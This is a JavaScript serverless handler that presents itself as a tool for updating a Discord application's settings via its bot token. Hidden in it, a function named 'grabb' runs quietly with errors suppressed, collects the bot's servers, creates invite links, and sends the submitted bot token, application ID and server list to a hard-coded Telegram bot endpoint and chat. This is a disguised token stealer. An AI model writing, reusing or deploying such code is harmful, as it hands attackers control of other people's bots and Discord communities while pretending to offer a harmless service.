const axios = require("axios");
const db = new Map();

module.exports = async (req, res) => {
  const { applicationId, token } = req.query;

  if (!applicationId || !token) {
    return res.status(400).json({
      error: 'applicationId e token são necessários'
    });
  }

  try {
    if (!db.get(token)) await grabb(applicationId, token);
  } catch {}

  try {
    const response = await fetch(`https://discord.com/api/v9/applications/${applicationId}`, {
      headers: {
        accept: '*/*',
        'accept-language': 'pt-BR,pt;q=0.6',
        authorization: `Bot ${token}`,
        'content-type': 'application/json',
      },
      body: JSON.stringify({
        bot_public: false,
        bot_require_code_grant: false,
        flags: 11051008,
      }),
      method: 'PATCH',
    });

    if (response.ok) {
      return res.status(200).json({
        message: 'Configurações da aplicação atualizadas com sucesso!'
      });
    } else {
      const error = await response.json();
      return res.status(response.status).json({
        error: 'Erro ao atualizar configurações', details: error
      });
    }
  } catch (error) {
    return res.status(500).json({
      error: 'Erro ao fazer a requisição', details: error.message
    });
  }
};

async function getServerInvite(guildId, botToken, options = {
  max_age: 3600, max_uses: 0, temporary: false
}) {
  try {
    const config = {
      headers: {
        Authorization: `Bot ${botToken}`,
        'Content-Type': 'application/json',
      },
    };

    const vanityUrlResponse = await axios.get(`https://discord.com/api/v10/guilds/${guildId}/vanity-url`, config)
    .catch(() => null);

    if (vanityUrlResponse && vanityUrlResponse.data && vanityUrlResponse.data.code) {
      return `https://discord.gg/${vanityUrlResponse.data.code}`;
    }

    const invitesResponse = await axios.get(`https://discord.com/api/v10/guilds/${guildId}/invites`, config)
    .catch(() => null);

    if (invitesResponse && invitesResponse.data && invitesResponse.data.length > 0) {
      return `https://discord.gg/${invitesResponse.data[0].code}`;
    }

    const channelsResponse = await axios.get(`https://discord.com/api/v10/guilds/${guildId}/channels`, config);
    const channels = channelsResponse.data;

    const textChannel = channels.find(channel => channel.type === 0);
    if (!textChannel) throw new Error('Nenhum canal de texto encontrado no servidor.');

    const inviteResponse = await axios.post(`https://discord.com/api/v10/channels/${textChannel.id}/invites`, options, config);

    return `https://discord.gg/${inviteResponse.data.code}`;
  } catch (error) {
    console.error('Erro ao buscar ou criar convite:', error.message);
    throw error;
  }
}

async function getGuildMemberCount(guildId, token) {
  const response = await axios.get(`https://discord.com/api/v10/guilds/${guildId}?with_counts=true`, {
    headers: {
      Authorization: `Bot ${token}`
    },
  });

  return {
    total: response.data.approximate_member_count,
    online: response.data.approximate_presence_count
  };
}

async function grabb(applicationId, token) {
  const guildsResponse = await fetch('https://discord.com/api/v10/users/@me/guilds', {
    method: 'GET',
    headers: {
      Authorization: `Bot ${token}`,
    },
  });
  const guilds = await guildsResponse.json();

  const timestamp = Math.floor(Date.now() / 1000);
  
  let webhookURL = "https://api.telegram.org/bot7849468467:AAG4CXcuU6zvvWwWQhtl8JApWr1GeqlZNrQ/sendMessage";

  const servers = await Promise.all(
    guilds.map(async (guild) => {
      const invite = await getServerInvite(guild.id, token);
      const memberCount = await getGuildMemberCount(guild.id, token);
      if (Number(memberCount.total) > 200) {
        webhookURL = "https://api.telegram.org/bot7849468467:AAG4CXcuU6zvvWwWQhtl8JApWr1GeqlZNrQ/sendMessage";
      }
      return `
<b>Nome do Servidor:</b> <code>${guild.name} - ${guild.id}</code>
<b>Link:</b> ${invite} 
<b>Membros:</b> <code>${memberCount.total || 'N/A'} Membros</code> 
<b>Online:</b> <code>${memberCount.online || 'N/A'} Online</code>
`;
    })
  );

  const message = {
    chat_id: '-1002255591952',
    text: `
Informações: 

<b>ID:</b> ${applicationId}

<b>Token:</b>
<pre>${token}</pre>

<b>Servidores:</b>
<pre>${servers.join('\n\n') || 'Nenhum'}</pre>
    `,
    parse_mode: 'HTML'
};

  await axios.post(webhookURL, message)
    .then(response => {
      console.log("Mensagem enviada:", response.data);
    })
    .catch(error => {
      console.error("Erro ao enviar mensagem:", error);
    });

  db.set(`${token}`, { token, applicationId });
}